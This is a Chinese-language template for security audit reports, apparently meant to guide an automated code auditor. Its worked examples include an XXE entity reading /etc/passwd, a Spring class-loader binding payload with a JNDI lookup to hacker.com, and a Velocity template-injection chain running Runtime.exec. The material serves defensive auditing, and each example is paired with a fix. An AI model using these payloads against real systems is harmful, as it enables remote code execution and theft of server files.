# 标准化漏洞报告模板

每个漏洞报告包含核心三部分：**描述**、**漏洞详情**、**修复建议**，并配合**漏洞列表**和**审计进度**展示。

---

## 报告整体结构

```markdown
# [项目名称] 安全审计报告

## 漏洞列表

| 序号 | 漏洞名称 |
|------|---------|
| 1 | [漏洞名称1] |
| 2 | [漏洞名称2] |
| ... | ... |

## 审计进度

| 审计层级 | 进度 | 说明 |
|---------|------|------|
| L1 危险模式扫描 | ✅ 已完成 | 发现 X 个候选漏洞 |
| L2 双轨审计 | ✅ 已完成 | 确认 Y 个有效漏洞 |
| L3 调用链验证 | ✅ 已完成 | 全部漏洞已验证 |

---

## 详细漏洞报告

# [漏洞名称1]

### 描述

[漏洞归纳描述，100字左右]

### 漏洞详情

**代码位置**：

[问题代码的完整绝对路径]:[行号]

**问题代码展示**：

```java
// 带行号的问题代码展示，包含上下文
```

**漏洞分析**：

[细颗粒度整体分析，300字以上，面面俱到]

### 修复建议

[完整的解决方案，贴合代码实际情况]

---

# [漏洞名称2]

...
```

---

## ⚠️ 报告格式规范

### 1. 标题层级

| 内容 | 标签 | 说明 |
|------|------|------|
| 漏洞名称 | h1 (`#`) | 单独一个大名称 |
| 描述 | h3 (`###`) | 漏洞归纳描述 |
| 漏洞详情 | h3 (`###`) | 包含代码位置、代码展示、漏洞分析 |
| 修复建议 | h3 (`###`) | 完整解决方案 |

### 2. 禁止在标题中添加严重程度标签

```markdown
❌ 错误：
# 任意文件上传漏洞（Critical）

✅ 正确：
# 任意文件上传漏洞
```

### 3. 代码位置必须使用完整绝对路径

```markdown
❌ 错误：
**代码位置**：
CommonController.java:49-62

✅ 正确：
**代码位置**：
E:\工作代码\xx\xx\src\main\java\com\example\controller\CommonController.java:49-62
```

---

## 各部分详细规范

### 一、描述（h3）

**要求**：对漏洞进行归纳描述，字数在100字左右。

**必须包含**：
- 漏洞类型
- 核心成因
- 主要风险点

**示例**：
```markdown
### 描述

在文件导入后，解析 Excel 时使用 EasyExcel 对数据进行解析，没有配置禁用 XML 外部实体的选项，
MultipartFile file 来自用户输入导致存在 XXE 风险。该文件导入接口没有文件类型校验和文件大小限制，
存在任意文件导入和 DoS 问题。
```

---

### 二、漏洞详情（h3）

漏洞详情细分为三个模块：**代码位置**、**问题代码展示**、**漏洞分析**。

#### 2.1 代码位置

**要求**：
1. 书写问题代码的完整绝对路径
2. **必须包含多行上下文（5-10行）**，而非单行
3. 展示数据来源和调用上下文

**格式**：
```markdown
**代码位置**：

| 文件 | 行号 | 说明 |
|------|------|------|
| E:\项目路径\src\views\commodity\modules\GoodsDetail4SyncPage.vue | 50-70 | 商品详情渲染 |
| E:\项目路径\src\api\goods.js | 15-25 | API 数据获取 |
```

**⚠️ 禁止只写单行**：
```markdown
❌ 错误：
**代码位置**：
src\views\commodity\modules\GoodsDetail4SyncPage.vue:59

✅ 正确：
**代码位置**：
src\views\commodity\modules\GoodsDetail4SyncPage.vue:50-70（漏洞点在第59行）
```

#### 2.2 问题代码展示

**要求**：
1. 对问题代码进行展示，**包含其上下文（5-10行）**
2. **必须展示数据来源**（参数、props、API 响应等）
3. 标注漏洞点的具体行号

**格式**：
```markdown
**问题代码展示**：

```vue
<!-- GoodsDetail4SyncPage.vue 第 50-70 行 -->
<template>
  <a-form-item label="手机端详情">
    <!-- 第 59 行：漏洞点 - v-html 直接渲染用户数据 -->
    <div v-html="record.mobileRichData"></div>
  </a-form-item>
  <a-form-item label="pc端详情">
    <!-- 第 66 行：漏洞点 - v-html 直接渲染用户数据 -->
    <div v-html="record.webRichData"></div>
  </a-form-item>
</template>

<script>
export default {
  data() {
    return {
      record: {}  // 数据来源：API 响应
    }
  },
  mounted() {
    // 第 120 行：数据来自 API，未经前端过滤
    this.getGoodsDetail()
  },
  methods: {
    async getGoodsDetail() {
      const res = await getGoodsDetailApi(this.id)
      this.record = res.data  // 直接赋值，无过滤
    }
  }
}
</script>
```

**数据来源分析**：
- `record` 来自 `getGoodsDetailApi()` API 响应
- API 返回 `mobileRichData` 和 `webRichData` 富文本内容
- 数据未经任何 HTML 过滤直接渲染
```

#### 2.3 漏洞分析

**要求**：对该漏洞进行细颗粒度的整体分析，要面面俱到，详细完整阐述该问题，字数在 **1500字以上（L4 级别）**。

**必须包含**：
1. **具体方法名**：精确到 `ClassName.methodName()`
2. **调用链追踪**：从入口到漏洞点的完整路径，每一跳标注 文件:行号
3. **数据流分析**：xxx调用了xxx方法，xxx方法接收xxx参数，参数来自xxx，然后执行了xxx操作，最后进入xxx方法执行xxx函数，中间没有过滤
4. **缺少的安全控制**：表格形式列出
5. **攻击路径**：步骤形式（1、2、3...）
6. **对比分析**：与安全代码的差异，其他接口/方法是怎么做的
7. **未使用的安全机制**：项目中存在但未启用
8. **漏洞类型归纳**：CWE 标准分类

**⚠️ 数据流分析写作规范（重要）**

漏洞分析必须包含完整的数据流追踪，格式如下：

```
1. 入口点：xxx接口/方法接收xxx参数
2. 参数传递：xxx方法调用xxx方法，传入xxx参数
3. 中间处理：xxx方法对参数进行xxx操作（如有）
4. 漏洞点：最终进入xxx方法执行xxx函数
5. 安全检查：中间是否有过滤/验证（有/无）
6. 风险：攻击者可以通过xxx进行xxx攻击
```

**示例**：
```markdown
**数据流分析**：

1. **入口点**：`GoodsDetail4SyncPage.vue` 组件的 `mounted()` 钩子（第115行）调用 `getGoodsDetail()` 方法
2. **API 调用**：`getGoodsDetail()` 方法（第120行）调用 `getGoodsDetailApi()` API
3. **数据返回**：API 返回 `record` 对象，包含 `mobileRichData` 和 `webRichData` 字段
4. **数据赋值**：`this.record = res.data`（第125行），直接赋值，无任何过滤
5. **数据绑定**：模板中 `v-html="record.mobileRichData"`（第59行）直接绑定
6. **渲染执行**：Vue 渲染时，`mobileRichData` 中的 HTML/JS 代码被直接执行
7. **安全检查**：全程无任何 HTML 过滤或 CSP 保护

**风险**：攻击者可以通过商品编辑接口注入恶意脚本，当用户访问商品详情页时，脚本自动执行，窃取用户 token 或执行恶意操作。
```

**⚠️ 对比分析写作规范（重要）**

漏洞分析必须包含与其他接口/方法的对比，说明安全与不安全的差异：

**格式**：
```markdown
**对比分析**：

| 接口/方法 | 渲染方式 | 安全措施 | 风险等级 |
|-----------|----------|----------|----------|
| 商品详情页 | `v-html` | ❌ 无过滤 | 高危 |
| 活动详情页 | `v-html` | ❌ 无过滤 | 高危 |
| 用户评论页 | `{{ content }}` | ✅ Vue 自动转义 | 安全 |
| 公告详情页 | `v-html` | ❌ 无过滤 | 高危 |

**安全实现对比**：

用户评论页使用 `{{ content }}` 插值语法，Vue 会自动对 HTML 进行转义：
```vue
<!-- 安全的实现 -->
<div>{{ comment.content }}</div>  <!-- 自动转义，XSS 无效 -->
```

而商品详情页直接使用 `v-html`，无任何过滤：
```vue
<!-- 危险的实现 -->
<div v-html="record.mobileRichData"></div>  <!-- 直接渲染，XSS 可执行 -->
```

**结论**：项目中富文本渲染统一缺少安全过滤，属于系统性问题。应在 `v-html` 使用前统一调用 HTML 净化函数。
```

**⚠️ 分析深度要求（L4 级别）**：

漏洞分析必须达到 L4 级别（1500字以上），禁止写成简单的三点式（成因+攻击+影响）。L4 级别要求：

| 级别 | 字数要求 | 内容要求 |
|------|----------|----------|
| L1 | < 100字 | 简单描述漏洞类型 |
| L2 | 100-300字 | 包含基本攻击方式 |
| L3 | 300-1500字 | 包含调用链、安全控制分析 |
| **L4** | **1500字以上** | **完整 7 要素，详细攻击路径，代码对比分析** |

**⚠️ 漏洞分析写作规范（重要）**

漏洞分析必须按照以下结构书写（约 200-300 字）：

```
1. 指出危险代码位置和具体代码
2. 说明该配置/代码的风险
3. 分析当前状态（是否有受影响的接口）
4. 分析当前 DTO/参数的字段情况
5. 给出风险场景：如果未来新增某接口会如何
6. 具体的攻击路径和恶意输入示例
7. 攻击原理的解释
```

**完整示例**：
```markdown
**漏洞分析**：

在 HotelGroupBaseInfoController 中存在危险的 @InitBinder 配置：`binder.setDisallowedFields(new String[]{})`（第169-172行）。该配置显式禁用 Spring 的字段过滤机制，若项目中存在通过请求参数绑定对象的端点，攻击者可构造恶意参数触发安全风险。

当前该控制器仅有一个接口 `/list` 使用表单参数绑定（`@Valid GetHotelGroupBaseListRequest request`，无 `@RequestBody`），但 DTO 只含三个字段（size、current、supId），均为分页参数，无敏感字段。若后续新增参数绑定接口（如 `@GetMapping("/export") public void export(ExportCondition condition)`），攻击者可构造恶意 URL：`?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{jndi:ldap://hacker.com/exp}`。Spring 在绑定参数时，会以 DTO 对象为反射起点，通过 `getClass().getModule().getClassLoader()...` 链式反射直达 Tomcat 核心组件，篡改配置注入恶意表达式。关键点：恶意参数并非绑定到 DTO 业务字段，而是利用 Java 对象继承 Object 的特性，将业务对象作为"跳板"直达底层。
```

**另一个示例（XXE 漏洞）**：
```markdown
**漏洞分析**：

在 ExcelController.importExcel() 方法中，使用 EasyExcel 解析用户上传的 Excel 文件（ExcelController.java:35-42），未配置禁用 XML 外部实体选项。Excel 文件本质是 ZIP 压缩的 XML 文件集合，攻击者可构造恶意 Excel 文件触发 XXE 攻击。

当前接口接收 MultipartFile 类型的文件参数，直接传入 `EasyExcel.read()` 进行解析，无任何安全校验。若攻击者构造包含外部实体定义的恶意 Excel 文件，在 XML 中定义 `<!ENTITY secret SYSTEM "file:///etc/passwd">`，上传后服务器解析时触发 XXE，读取服务器敏感文件。调用链：`HTTP POST /import → ExcelController.importExcel() → ExcelUtil.importExcel() → EasyExcel.read() → XML 解析触发 XXE`。关键点：EasyExcel 底层使用 XML 解析器，默认允许外部实体，需显式禁用。
```

---

### 三、修复建议（h3）

**要求**：对该问题提出完整的解决方案，贴合代码实际情况书写。

**必须包含**：
1. 具体的修复方案（分点说明）
2. 可直接使用的修复代码

**示例**：
```markdown
### 修复建议

**1. 限制上传类型和文件大小**：

```java
private static final Set<String> ALLOWED_TYPES = Set.of(
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
);
private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

public static List<GeographicalInformationDto> importExcel(MultipartFile file) {
    // 校验文件类型
    String contentType = file.getContentType();
    if (!ALLOWED_TYPES.contains(contentType)) {
        throw new RuntimeException("不支持的文件类型");
    }
    
    // 校验文件大小
    if (file.getSize() > MAX_FILE_SIZE) {
        throw new RuntimeException("文件大小超过限制");
    }
    // ...
}
```

**2. 禁用 XML 外部实体解析**：

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```
```

---

## 完整示例

### 示例1: XXE 漏洞（文件上传接口）

# EasyExcel XXE 外部实体注入漏洞

### 描述

在文件导入后，解析 Excel 时使用 EasyExcel 对数据进行解析，没有配置禁用 XML 外部实体的选项，
MultipartFile file 来自用户输入导致存在 XXE 风险。该文件导入接口没有文件类型校验和文件大小限制，
存在任意文件导入和 DoS 问题。

### 漏洞详情

**代码位置**：

```
E:\工作代码\项目名\src\main\java\com\example\controller\ExcelController.java:35
E:\工作代码\项目名\src\main\java\com\example\util\ExcelUtil.java:79
```

**问题代码展示**：

```java
// ExcelController.java
@PostMapping("/import")
public Result importExcel(@RequestParam("file") MultipartFile file) {
    if (file == null || file.isEmpty()) {
        throw new RuntimeException("没有文件或者文件内容为空！");
    }
    // 第35行：直接传入 ExcelUtil.importExcel 进行解析
    List<GeographicalInformationDto> dataList = ExcelUtil.importExcel(file);
    // ...
}

// ExcelUtil.java 第79行
public static List<GeographicalInformationDto> importExcel(MultipartFile file) {
    // ...
    ExcelListener<GeographicalInformationDto> listener = new ExcelListener<>();
    // 没有配置禁用 XML 外部实体的选项
    EasyExcel.read(ipt, GeographicalInformationDto.class, listener).sheet().doRead();
    // ...
}
```

**漏洞分析**：

`ExcelController.importExcel()` 方法（ExcelController.java:35）接收 MultipartFile 参数，
直接调用 `ExcelUtil.importExcel()` 进行 Excel 解析，未配置任何安全防护措施。

**调用链追踪**：
```
HTTP POST /import
  → ExcelController.importExcel() (ExcelController.java:35)
    → ExcelUtil.importExcel() (ExcelUtil.java:79)
      → EasyExcel.read().sheet().doRead() (ExcelUtil.java:82)
        → XML 解析触发 XXE
```

**数据流分析**：

1. **入口点**：`ExcelController.importExcel()` 方法（ExcelController.java:35）接收 `MultipartFile file` 参数
2. **参数来源**：`file` 参数来自 HTTP 请求，用户可控
3. **方法调用**：直接调用 `ExcelUtil.importExcel(file)`（第38行），无任何校验
4. **中间处理**：`ExcelUtil.importExcel()` 方法（ExcelUtil.java:79）获取文件输入流
5. **漏洞点**：`EasyExcel.read(ipt, GeographicalInformationDto.class, listener).sheet().doRead()`（第82行）
6. **安全检查**：全程无任何文件类型校验、大小限制、XXE 防护
7. **风险**：攻击者可以通过构造恶意 Excel 文件触发 XXE，读取服务器敏感文件

**缺少的安全控制**：

| 控制类型 | 状态 | 说明 |
|---------|------|------|
| 文件类型校验 | ❌ 缺失 | 未检查 Content-Type 和文件扩展名 |
| 文件内容校验 | ❌ 缺失 | 未检查文件魔数/文件头 |
| 文件大小限制 | ❌ 缺失 | 可上传超大文件触发 DoS |
| XXE 防护 | ❌ 缺失 | 未禁用 XML 外部实体 |

**攻击路径**：

1. 攻击者构造恶意 Excel 文件（.xlsx 本质是 ZIP 压缩的 XML 文件集合）
2. 在 XML 中定义外部实体指向敏感文件：
   ```xml
   <!DOCTYPE data [
       <!ENTITY secret SYSTEM "file:///etc/passwd">
   ]>
   <data>&secret;</data>
   ```
3. 通过文件上传接口提交恶意 Excel 文件
4. EasyExcel 解析时触发 XXE，读取服务器敏感文件
5. 文件内容可能通过错误消息或响应返回给攻击者

**对比分析**：

| 接口 | 文件类型校验 | 大小限制 | XXE 防护 | 风险等级 |
|------|-------------|----------|----------|----------|
| ExcelController.importExcel() | ❌ 无 | ❌ 无 | ❌ 无 | 高危 |
| ImageController.uploadImage() | ✅ 白名单 | ✅ 10MB | ✅ 已配置 | 安全 |
| FileController.upload() | ✅ 扩展名检查 | ✅ 50MB | ❌ 无 | 中危 |

**安全实现对比**：

`ImageController.uploadImage()` 方法有完整的安全校验：
```java
// ImageController.java - 安全实现
@PostMapping("/uploadImage")
public Result uploadImage(@RequestParam("file") MultipartFile file) {
    // 1. 文件类型校验
    String contentType = file.getContentType();
    if (!ALLOWED_TYPES.contains(contentType)) {
        throw new RuntimeException("不支持的文件类型");
    }
    
    // 2. 文件大小限制
    if (file.getSize() > MAX_FILE_SIZE) {
        throw new RuntimeException("文件大小超过限制");
    }
    
    // 3. 文件重命名（防止路径遍历）
    String newFilename = UUID.randomUUID() + getExtension(file);
    // ...
}
```

而 `ExcelController.importExcel()` 完全没有这些校验：
```java
// ExcelController.java - 危险实现
@PostMapping("/import")
public Result importExcel(@RequestParam("file") MultipartFile file) {
    // 无任何校验，直接处理
    List<GeographicalInformationDto> dataList = ExcelUtil.importExcel(file);
    return Result.success(dataList);
}
```

**结论**：`ExcelController` 缺少基本的安全校验，与 `ImageController` 形成明显对比，属于系统性安全问题。

**未使用的安全机制**：
项目已引入 Apache POI 依赖，POI 提供了安全解析选项，但未启用：
```xml
<dependency>
    <groupId>org.apache.poi</groupId>
    <artifactId>poi-ooxml</artifactId>
    <version>5.2.3</version>
</dependency>
```

**漏洞类型归纳**：XXE 外部实体注入（CWE-611）、任意文件上传（CWE-434）

### 修复建议

**1. 添加文件类型和大小校验**：

```java
private static final Set<String> ALLOWED_TYPES = Set.of(
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
);
private static final long MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

public Result importExcel(@RequestParam("file") MultipartFile file) {
    // 校验文件类型
    String contentType = file.getContentType();
    if (!ALLOWED_TYPES.contains(contentType)) {
        throw new RuntimeException("不支持的文件类型");
    }
    
    // 校验文件大小
    if (file.getSize() > MAX_FILE_SIZE) {
        throw new RuntimeException("文件大小超过限制（最大10MB）");
    }
    
    // 校验文件扩展名
    String filename = file.getOriginalFilename();
    if (filename == null || !filename.toLowerCase().endsWith(".xlsx")) {
        throw new RuntimeException("文件扩展名不合法");
    }
    // ...
}
```

**2. 禁用 XML 外部实体解析**：

```java
public static List<GeographicalInformationDto> importExcel(MultipartFile file) {
    InputStream is = file.getInputStream();
    BufferedInputStream ipt = new BufferedInputStream(is);
    
    // 配置安全的 XML 解析器
    SAXParserFactory factory = SAXParserFactory.newInstance();
    factory.setNamespaceAware(true);
    factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setXIncludeAware(false);
    
    XMLReader xmlReader = factory.newSAXParser().getXMLReader();
    
    ExcelReaderBuilder builder = EasyExcel.read(ipt, GeographicalInformationDto.class, listener);
    builder.xmlReader(xmlReader);
    builder.sheet().doRead();
    // ...
}
```

---

### 示例2: Velocity SSTI 远程代码执行

# Velocity 模板注入远程代码执行漏洞

### 描述

TemplateController.renderTemplate() 方法接收用户输入的 template 参数，直接传入 Velocity.evaluate() 
进行模板渲染，未配置 SecureUberspector 限制反射调用。攻击者可构造恶意 Velocity 模板代码，
通过反射调用 Runtime.exec() 执行任意系统命令，导致服务器被完全控制。

### 漏洞详情

**代码位置**：

```
E:\工作代码\项目名\src\main\java\com\example\controller\TemplateController.java:45-52
```

**问题代码展示**：

```java
// TemplateController.java
@PostMapping("/render")
public String renderTemplate(@RequestParam String template) {
    VelocityContext context = new VelocityContext();
    StringWriter writer = new StringWriter();
    // 危险：用户输入直接作为模板内容
    Velocity.evaluate(context, writer, "userTemplate", template);
    return writer.toString();
}
```

**漏洞分析**：

`TemplateController.renderTemplate()` 方法（TemplateController.java:45-52）接收用户输入的 
`template` 参数，未经任何过滤或白名单校验，直接作为模板内容传入 `Velocity.evaluate()` 
进行渲染。Velocity 模板引擎默认允许通过反射调用任意 Java 类和方法，形成严重的 SSTI 漏洞。

**调用链追踪**：
```
TemplateController.renderTemplate() (TemplateController.java:45)
  → Velocity.evaluate() (TemplateController.java:49)
    → Velocity 模板引擎解析执行
```

**缺少的安全控制**：

| 控制类型 | 状态 | 说明 |
|---------|------|------|
| 输入过滤 | ❌ 缺失 | 未对模板内容进行任何过滤 |
| 白名单校验 | ❌ 缺失 | 未限制可使用的模板语法 |
| SecureUberspector | ❌ 缺失 | 未配置限制反射调用 |
| 沙箱隔离 | ❌ 缺失 | 未启用模板沙箱 |

**攻击路径**：

1. 攻击者构造包含恶意 Velocity 语法的模板字符串：
   ```velocity
   #set($x='')
   #set($rt=$x.class.forName('java.lang.Runtime'))
   #set($ex=$rt.getRuntime().exec('whoami'))
   ```
2. 通过 HTTP 请求将恶意模板提交到 `/render` 接口
3. Velocity 引擎解析模板，通过反射链获取 Runtime 对象
4. 调用 `Runtime.exec('whoami')` 执行系统命令
5. 攻击者获得服务器完全控制权

**恶意输入示例**：
```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$x.class.forName('java.io.BufferedReader').newInstance($x.class.forName('java.io.InputStreamReader').newInstance($is)))
#set($line=$br.readLine())
$line
```

**对比分析**：
安全的模板渲染实现应：
- 使用预定义模板文件，而非用户输入
- 配置 SecureUberspector 限制反射调用
- 启用模板沙箱隔离
- 对输出进行 HTML 编码防止 XSS

当前实现完全违反了这些安全原则。

**未使用的安全机制**：
Velocity 提供了 `SecureUberspector` 用于限制反射调用，但未配置：
```java
// 安全配置示例（未启用）
VelocityEngine ve = new VelocityEngine();
ve.setProperty("runtime.introspector.uberspect", 
    "org.apache.velocity.util.introspection.SecureUberspector");
```

**漏洞类型归纳**：服务端模板注入（CWE-94）、远程代码执行（CWE-78）

### 修复建议

**1. 立即修复 - 配置 SecureUberspector**：

```java
VelocityEngine ve = new VelocityEngine();
ve.setProperty("runtime.introspector.uberspect", 
    "org.apache.velocity.util.introspection.SecureUberspector");
ve.init();

VelocityContext context = new VelocityContext();
StringWriter writer = new StringWriter();
ve.evaluate(context, writer, "userTemplate", template);
```

**2. 架构优化 - 使用预定义模板**：

```java
// 安全做法：不将用户输入直接作为模板内容
VelocityEngine ve = new VelocityEngine();
ve.init();

// 使用预定义模板文件
Template template = ve.getTemplate("templates/safe-template.vm");
VelocityContext context = new VelocityContext();
context.put("userContent", sanitizedInput);  // 用户内容作为参数注入

StringWriter writer = new StringWriter();
template.merge(context, writer);
return writer.toString();
```

**3. 纵深防御 - 输入白名单校验**：

```java
private static final Pattern SAFE_CONTENT = Pattern.compile("^[a-zA-Z0-9\\s\\.,!?]+$");

public String renderTemplate(@RequestParam String template) {
    // 白名单校验
    if (!SAFE_CONTENT.matcher(template).matches()) {
        throw new SecurityException("非法输入：仅允许字母、数字和基本标点");
    }
    // ...
}
```

---

## 行号定位规范

### 精确行号要求

**必须使用实际 Read/Select-String 验证的行号**，禁止模糊范围或猜测。

| 错误示例 | 正确示例 | 说明 |
|----------|----------|------|
| `HeaderModelUtils.java:18-35` | `HeaderModelUtils.java:35` | 精确到方法起始行 |
| `HttpUtil.java:177-193` | `HttpUtil.java:252-253, 321` | 多段代码分开标注 |

### 行号验证方法

```powershell
# 使用 Select-String 验证行号
Select-String -Path $file -Pattern "getLoginUserByStr|TrustAllTrustManager" | 
  ForEach-Object { Write-Host "Line $($_.LineNumber): $($_.Line.Trim())" }
```

---

## CVE 编号核实规范

### ⚠️ 禁止凭记忆编造 CVE 编号

**铁律**：所有 CVE 编号必须联网核实，禁止凭记忆/猜测编造。

#### 核实流程

```markdown
Step 1: 使用 tavily 搜索
  web_search "<组件名> <版本号> CVE" -n 10

Step 2: 确认来源可靠
  ✅ NVD (nvd.nist.gov)
  ✅ Snyk (security.snyk.io)
  ✅ 官方公告 (Apache/GitHub Security Advisories)
  ❌ 随机博客/论坛帖子

Step 3: 确认组件对应关系
  某个 CVE 可能只影响特定框架/组件
  
  示例：
  - CVE-2020-1948 → Apache Dubbo（不是 Hessian）
  - CVE-2021-44228 → Log4j 2.0-beta9 to 2.15.0
```

---

## 漏洞分析验证检查清单

### ⚠️ 关键验证步骤（必须执行）

在写入报告前，必须验证以下内容：

#### 1. 类继承关系验证

当涉及"覆盖"、"绕过"等描述时，**必须验证继承关系**：

```powershell
# 验证方法：搜索类定义
Select-String -Pattern "class.*Controller.*extends|class.*Controller\s*\{"
```

**错误示例**：
```
❌ 错误结论：FeignServiceController 覆盖了 BaseController 的防护
✅ 事实：FeignServiceController 根本没有继承 BaseController
```

**教训案例**（2026-04-01）：
> 报告中写"批量分配防护被覆盖"，但 FeignServiceController 等并未继承 BaseController。
> 错误原因：只看 `@InitBinder` 方法，未验证类继承关系。
> 正确做法：先检查 `extends`，再判断是"覆盖"还是"缺失"。

#### 2. 配置生效条件验证

当涉及"配置失效"、"安全机制未启用"等描述时，**必须验证配置生效条件**：

| 描述 | 需验证 |
|------|--------|
| "配置被覆盖" | 是否真的继承了父类？ |
| "机制未启用" | 启用条件是什么？是否满足？ |
| "绕过验证" | 真的有验证逻辑吗？还是根本就没有？ |

#### 3. 因果关系验证

| 描述 | 验证问题 |
|------|----------|
| A 导致 B | A 真的是 B 的原因吗？有其他因素吗？ |
| 绕过了 X | X 真的存在吗？真的被绕过了吗？ |
| 覆盖了 Y | Y 真的被继承了吗？ |

#### 4. ⚠️ 批量分配/参数绑定验证（重要）

当涉及 `@InitBinder`、`setDisallowedFields`、批量分配等描述时，**必须验证以下内容**：

**Step 1：验证参数绑定方式**

```powershell
# 检查接口的参数注解
Select-String -Path $controllerFile -Pattern "@RequestBody|@ModelAttribute|@RequestParam|public.*\("
```

| 参数注解 | 受 @InitBinder 影响 | 风险评估 |
|---------|-------------------|---------|
| `@RequestBody` | ❌ 否（JSON 反序列化） | 需检查 DTO 字段 |
| `@ModelAttribute` | ✅ 是 | 高风险，需检查 |
| 无注解（对象参数） | ✅ 是 | 高风险，需检查 |
| `@RequestParam` | ⚠️ 部分（单个字段） | 低风险 |

**Step 2：验证业务场景**

| 问题 | 验证方法 |
|------|---------|
| 接口是否涉及用户管理？ | 搜索 `UserService`、`UserRepository`、`isAdmin` |
| DTO 是否包含敏感字段？ | 读取 DTO 类定义 |
| 接口是否写入数据库？ | 检查 Service 层是否有 `save`、`update`、`insert` |

**Step 3：验证攻击路径**

| 问题 | 验证方法 |
|------|---------|
| 攻击者能注入什么字段？ | 检查 DTO 所有字段 |
| 注入后能保存吗？ | 检查 Service 层是否有数据库操作 |
| 有敏感字段吗？ | 检查 `isAdmin`、`role`、`permission` 等 |

**错误案例（2026-04-01）**：

```
❌ 错误结论：批量分配防护被覆盖，攻击者可注入 isAdmin

❌ 未验证：
1. 4 个 Controller 未继承 BaseController（不存在"覆盖"）
2. 全部使用 @RequestBody（@InitBinder 无效）
3. 没有接口操作用户数据（无攻击路径）
4. DTO 无敏感字段（无注入价值）

✅ 正确结论：
HotelGroupBaseInfoController 存在危险的 @InitBinder 配置，
但当前仅 1 个接口使用表单绑定，DTO 只有分页参数，无敏感字段。
若未来新增参数绑定接口，可能存在风险。
```

**正确的分析流程**：

```
发现 @InitBinder 配置
    ↓
验证 1：类是否继承父类？（是"覆盖"还是"缺失"）
    ↓
验证 2：接口参数绑定方式？（@RequestBody 无效）
    ↓
验证 3：业务场景？（是否涉及敏感数据）
    ↓
验证 4：DTO 字段？（有无敏感字段）
    ↓
验证 5：攻击路径？（能否注入？能否保存？）
    ↓
综合评估：当前状态 + 风险场景
```

### 验证命令速查

```powershell
# 1. 验证类继承关系
Select-String -Path $file -Pattern "class.*extends"

# 2. 验证方法是否存在
Select-String -Path $file -Pattern "methodName"

# 3. 验证调用关系
Select-String -Path $files -Pattern "ClassName\.|new ClassName"
```

### 报告中的正确表述

| 场景 | ❌ 错误表述 | ✅ 正确表述 |
|------|-----------|-----------|
| 未继承父类 | "覆盖了父类防护" | "未继承父类，缺少防护" |
| 配置未启用 | "禁用了安全配置" | "未配置安全选项" |
| 功能缺失 | "绕过了验证" | "无验证逻辑" |

---

## 报告生成检查清单

### 描述部分
- [ ] 字数控制在100字左右
- [ ] 清晰说明漏洞类型、成因、核心风险点

### 漏洞详情部分
- [ ] 代码位置准确（完整绝对路径 + 行号）
- [ ] 问题代码展示包含上下文
- [ ] 漏洞分析300字以上，包含：
  - [ ] 调用链追踪
  - [ ] 缺少的安全控制（表格形式）
  - [ ] 攻击路径
  - [ ] 对比分析
  - [ ] 漏洞类型归纳

### 修复建议部分
- [ ] 针对具体问题给出修复方案
- [ ] 提供可直接使用的修复代码

---

## 状态定义

| 状态 | 定义 | 要求 |
|------|------|------|
| **CONFIRMED** | 已验证可利用 | PoC 可执行，调用链完整，影响明确 |
| **HYPOTHESIS** | 疑似漏洞，需人工验证 | 发现可疑模式但无法完全确认 |

**关键原则**：宁可标记为 HYPOTHESIS 让人工验证，也不要把不确定的发现标记为 CONFIRMED 污染报告可信度。